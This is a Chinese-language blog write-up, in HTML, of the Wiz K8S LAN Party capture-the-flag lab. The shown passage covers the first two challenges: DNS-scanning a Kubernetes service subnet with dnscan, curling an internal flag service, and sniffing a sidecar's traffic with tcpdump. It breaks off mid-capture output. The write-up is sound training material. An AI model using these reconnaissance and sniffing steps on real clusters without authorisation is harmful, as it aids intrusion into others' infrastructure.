@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Background地址https:&#x2F;&#x2F;k8slanparty.com&#x2F; 时间March 20, 2024 6:30 PM - March 22, 2024 10:30 PM Challenge 1：RECON题目描述 As a warmup, utilize DNS scanning to uncover hidden internal services and obtain the flag.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="K8S_LAN_PARTY_WriteUp">
+<meta property="og:url" content="http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/index.html">
+<meta property="og:site_name" content="psych&#39;s blog">
+<meta property="og:description" content="Background地址https:&#x2F;&#x2F;k8slanparty.com&#x2F; 时间March 20, 2024 6:30 PM - March 22, 2024 10:30 PM Challenge 1：RECON题目描述 As a warmup, utilize DNS scanning to uncover hidden internal services and obtain the flag.">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-22T16:01:35.000Z">
+<meta property="article:modified_time" content="2024-03-22T16:02:32.985Z">
+<meta property="article:author" content="psych">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="k8s">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>K8S_LAN_PARTY_WriteUp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/03/22/%E6%98%93%E5%AD%A6%E5%AF%BC%E8%A8%80%E5%8F%8A%E5%A5%87%E9%97%A8%E9%81%81%E7%94%B2%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&text=K8S_LAN_PARTY_WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&is_video=false&description=K8S_LAN_PARTY_WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=K8S_LAN_PARTY_WriteUp&body=Check out this article: http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&name=K8S_LAN_PARTY_WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&t=K8S_LAN_PARTY_WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Background"><span class="toc-number">1.</span> <span class="toc-text">Background</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.</span> <span class="toc-text">地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4"><span class="toc-number">1.2.</span> <span class="toc-text">时间</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-1%EF%BC%9ARECON"><span class="toc-number">2.</span> <span class="toc-text">Challenge 1：RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">2.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%84%E5%BD%95"><span class="toc-number">2.4.</span> <span class="toc-text">附录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-2%EF%BC%9AFINDING-NEIGHBOURS"><span class="toc-number">3.</span> <span class="toc-text">Challenge 2：FINDING NEIGHBOURS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-1"><span class="toc-number">3.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">3.3.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-3%EF%BC%9ADATA-LEAKAGE"><span class="toc-number">4.</span> <span class="toc-text">Challenge 3：DATA LEAKAGE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">4.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-2"><span class="toc-number">4.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">4.3.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nfs-cat-%E5%92%8C-nfs-ls"><span class="toc-number">4.3.1.</span> <span class="toc-text">nfs-cat 和 nfs-ls</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NFS"><span class="toc-number">4.3.2.</span> <span class="toc-text">NFS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-mount"><span class="toc-number">4.3.3.</span> <span class="toc-text">查看 mount</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0-flag"><span class="toc-number">4.3.4.</span> <span class="toc-text">发现 flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-4%EF%BC%9ABYPASSING-BOUNDARIES"><span class="toc-number">5.</span> <span class="toc-text">Challenge 4：BYPASSING BOUNDARIES</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">5.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-3"><span class="toc-number">5.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-number">5.3.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lstio"><span class="toc-number">5.3.1.</span> <span class="toc-text">lstio</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iptabl"><span class="toc-number">5.3.2.</span> <span class="toc-text">iptabl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">5.3.3.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hint-%E5%88%86%E6%9E%90"><span class="toc-number">5.3.4.</span> <span class="toc-text">hint 分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81"><span class="toc-number">5.3.5.</span> <span class="toc-text">验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#challenge-5%EF%BC%9ALATERAL-MOVEMENT"><span class="toc-number">6.</span> <span class="toc-text">challenge 5：LATERAL MOVEMENT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4"><span class="toc-number">6.1.</span> <span class="toc-text">题目描述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Who-will-guard-the-guardians"><span class="toc-number">6.1.1.</span> <span class="toc-text">Who will guard the guardians?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hint"><span class="toc-number">6.1.2.</span> <span class="toc-text">Hint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Policy"><span class="toc-number">6.1.3.</span> <span class="toc-text">Policy</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9-4"><span class="toc-number">7.</span> <span class="toc-text">考点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-number">7.1.</span> <span class="toc-text">分析</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        K8S_LAN_PARTY_WriteUp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">psych</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-22T16:01:35.000Z" class="dt-published" itemprop="datePublished">2024-03-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E4%BA%91%E5%8E%9F%E7%94%9F/">云原生</a> › <a class="category-link" href="/categories/%E4%BA%91%E5%8E%9F%E7%94%9F/k8s%E5%AE%89%E5%85%A8/">k8s安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/k8s/" rel="tag">k8s</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a target="_blank" rel="noopener" href="https://k8slanparty.com/">https://k8slanparty.com/</a></p>
+<h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h3><p>March 20, 2024 6:30 PM - March 22, 2024 10:30 PM</p>
+<h2 id="Challenge-1：RECON"><a href="#Challenge-1：RECON" class="headerlink" title="Challenge 1：RECON"></a>Challenge 1：RECON</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
+<p>As a warmup, utilize <a target="_blank" rel="noopener" href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue">DNS scanning</a> to uncover hidden internal services and obtain the flag. We have “loaded your machine with dnscan to ease this process for further challenges.</p>
+</blockquote>
+<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><ul>
+<li>DNScan</li>
+<li>service to ip</li>
+<li>curl</li>
+</ul>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol>
+<li>点进 DNS scanning 的链接，映入眼帘：</li>
+</ol>
+<blockquote>
+<p>We actually have access to a Kubernetes specific way to identify live services and sometimes pods in the form of the Kubernetes DNS service.</p>
+</blockquote>
+<p>也就是说通过 DNS 来探测服务。</p>
+<p>Service 被分配一个集群内可访问的 IP(Cluster IP) 地址，用于在集群内部将流量路由到对应 Pod，同时暴露端口到公网。与 Service 关联的 DNS 记录允许通过 Service 的名称来访问 Service。这些 DNS 记录由 DNS 解析器管理。</p>
+<blockquote>
+<p>Pod 和 Service 的 DNS 名称会自动生成如下：</p>
+<ul>
+<li>Pod：pod-ip-address.pod-namespace-name.pod.cluster-domain.example（例如 10.244.0.1.my-app.svc.cluster.local）</li>
+<li>Service：service-name.service-namespace-name.svc.cluster-domain.example（例如 database.my-app.svc.cluster.local）</li>
+</ul>
+</blockquote>
+<ol start="2">
+<li>也就是说，思路是用 DNScan，通过环境变量里的 HOST_SERVER IP来反查对应的 Service。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ <span class="built_in">env</span> | grep HOST</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.100.0.1</span><br><span class="line">player@wiz-k8s-lan-party:~$ dnscan -h</span><br><span class="line">Usage of dnscan:</span><br><span class="line">  -subnet string</span><br><span class="line">        Input to scan, CIDR notation (e.g., 10.5.0.0/24) or wildcard (e.g., 10.5.0.*)</span><br><span class="line">player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.1/16</span><br><span class="line">34967 / 65536 [-------------------------------------------------------------------------&gt;________________________________________________________________] 53.36% 988 p/s10.100.136.254 getflag-service.k8s-lan-party.svc.cluster.local.</span><br><span class="line">65415 / 65536 [-----------------------------------------------------------------------------------------------------------------------------------------&gt;] 99.82% 988 p/s10.100.136.254 -&gt; getflag-service.k8s-lan-party.svc.cluster.local.</span><br><span class="line">65536 / 65536 [-----------------------------------------------------------------------------------------------------------------------------------------] 100.00% 991 p/s</span><br></pre></td></tr></table></figure>
+
+<p>找到 service：<code>getflag-service.k8s-lan-party.svc.cluster.local.</code></p>
+<ol start="3">
+<li>想了一下没想到后续利用，想到环境变量里面由开443端口。直接访问该 IP，也就是 service 名称 getflag</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ <span class="built_in">env</span></span><br><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=443</span><br><span class="line">KUBERNETES_SERVICE_PORT=443</span><br><span class="line">USER_ID=063cd108-777e-421c-8c5b-ef053f624672</span><br><span class="line">HISTSIZE=2048</span><br><span class="line">PWD=/home/player</span><br><span class="line">HOME=/home/player</span><br><span class="line">KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443</span><br><span class="line">HISTFILE=/home/player/.bash_history</span><br><span class="line">TMPDIR=/tmp</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">SHLVL=1</span><br><span class="line">KUBERNETES_PORT_443_TCP_PROTO=tcp</span><br><span class="line">KUBERNETES_PORT_443_TCP_ADDR=10.100.0.1</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.100.0.1</span><br><span class="line">KUBERNETES_PORT=tcp://10.100.0.1:443</span><br><span class="line">KUBERNETES_PORT_443_TCP_PORT=443</span><br><span class="line">HISTFILESIZE=2048</span><br><span class="line">_=/usr/bin/env</span><br><span class="line"></span><br><span class="line"><span class="comment"># 万能 curl </span></span><br><span class="line">player@wiz-k8s-lan-party:~$ curl getflag-service.k8s-lan-party.svc.cluster.local</span><br><span class="line">wiz_k8s_lan_party&#123;between-thousands-of-ips-you-found-your-northen-star&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkwMDQ4MDU2MA==&mid=2247484222&idx=1&sn=5a1b2d72398280542e75c5310c6b1d19&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzkwMDQ4MDU2MA==&amp;mid=2247484222&amp;idx=1&amp;sn=5a1b2d72398280542e75c5310c6b1d19&amp;scene=21#wechat_redirect</a></p>
+<h2 id="Challenge-2：FINDING-NEIGHBOURS"><a href="#Challenge-2：FINDING-NEIGHBOURS" class="headerlink" title="Challenge 2：FINDING NEIGHBOURS"></a>Challenge 2：FINDING NEIGHBOURS</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
+<p>Sometimes, it seems we are the only ones around, but we should always be on guard against invisible <a target="_blank" rel="noopener" href="https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/">sidecars</a> reporting sensitive secrets.</p>
+</blockquote>
+<h3 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h3><ul>
+<li>sidecars(network)</li>
+<li>netstat</li>
+<li>tcpdump</li>
+</ul>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ol>
+<li>先点开 sidecars 看看怎么个事儿</li>
+</ol>
+<blockquote>
+<p><strong>Sidecar containers</strong> are the secondary containers that run along with the main application container within the same Pod These containers are used to enhance or to extend the functionality of the main application container by providing additional services, or functionality such as logging, monitoring, security, or data synchronization, without directly altering the primary application code.</p>
+</blockquote>
+<p>相当于一个附属容器，提供附加、扩展功能</p>
+<blockquote>
+<p>If an init container is created with its<code>restartPolicy</code>set to<code>Always</code>, it willstart and remain running during the entire life of the Pod. This can be helpful for running supporting services separated from the main application containers.</p>
+</blockquote>
+<p>配置 <code>restartpolicy=Always</code> 后 ，就会默认启动 sidecar 的功能并一直运行.</p>
+<ol start="2">
+<li>Hint 1</li>
+</ol>
+<blockquote>
+<p>Sidecar containers share the same lifecycle, resources, and network namespace with the primary container This co-location allows them to interact closely and share resources.</p>
+</blockquote>
+<p>共用相同的 network 和存储命名空间。</p>
+<ol start="3">
+<li>信息搜集</li>
+</ol>
+<ul>
+<li>service</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.1/16</span><br><span class="line">65395 / 65536 [-&gt;] 99.78% 988 p/s10.100.171.123 -&gt; reporting-service.k8s-lan-party.svc.cluster.local.</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>network</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ipip 0.0.0.0 brd 0.0.0.0</span><br><span class="line">2113: ns-252e81@if2114: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 06:27:94:7c:7d:aa brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 192.168.8.215/31 scope global ns-252e81</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::427:94ff:fe7c:7daa/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>netstat</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ netstat -ano </span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer</span><br><span class="line">tcp        0      0 192.168.8.215:45366     10.100.171.123:80       TIME_WAIT   timewait (30.31/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:34758     10.100.171.123:80       TIME_WAIT   timewait (50.36/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:39366     10.100.171.123:80       TIME_WAIT   timewait (40.44/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:36266     10.100.171.123:80       TIME_WAIT   timewait (20.28/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:43638     10.100.171.123:80       TIME_WAIT   timewait (15.27/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:34772     10.100.171.123:80       TIME_WAIT   timewait (50.46/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:45368     10.100.171.123:80       TIME_WAIT   timewait (35.33/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:34786     10.100.171.123:80       TIME_WAIT   timewait (55.48/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:34780     10.100.171.123:80       TIME_WAIT   timewait (55.38/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:39376     10.100.171.123:80       TIME_WAIT   timewait (45.45/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:42832     10.100.171.123:80       TIME_WAIT   timewait (5.24/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:39370     10.100.171.123:80       TIME_WAIT   timewait (45.35/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:42820     10.100.171.123:80       TIME_WAIT   timewait (0.23/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:36274     10.100.171.123:80       TIME_WAIT   timewait (25.30/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:39362     10.100.171.123:80       TIME_WAIT   timewait (40.34/0/0)</span><br><span class="line">tcp        0      0 192.168.8.215:43626     10.100.171.123:80       TIME_WAIT   timewait (10.26/0/0)</span><br><span class="line">Active UNIX domain sockets (servers and established)</span><br><span class="line">Proto RefCnt Flags       Type       State         I-Node   Path</span><br></pre></td></tr></table></figure>
+
+<p>本地的192.168.8.215 一直向 10.100.171.123:80 通信</p>
+<ol start="4">
+<li>好吧，看了wp，直接 <code>tcpdump</code> 捕获流量详细看看通信细节。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ tcpdump host 10.100.171.123  -w 1.pcap</span><br><span class="line">tcpdump: listening on ns-252e81, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">^C30 packets captured</span><br><span class="line">30 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br><span class="line">player@wiz-k8s-lan-party:~$ <span class="built_in">cat</span> 1.pcap</span><br><span class="line">ÔÃ²¡ïýe«¾</span><br><span class="line">JJ&gt;òVA4<span class="comment">#&#x27;|&#125;E&lt;6y@EäÀ×</span></span><br><span class="line">d«&#123;²¢P+SP´</span><br><span class="line">\\Iïýe³À</span><br><span class="line">JJ<span class="string">&#x27;|&#125;ª&gt;òVA4E&lt;@|]</span></span><br><span class="line"><span class="string">d«&#123;À×P²¢»­Ë+SPþ´</span></span><br><span 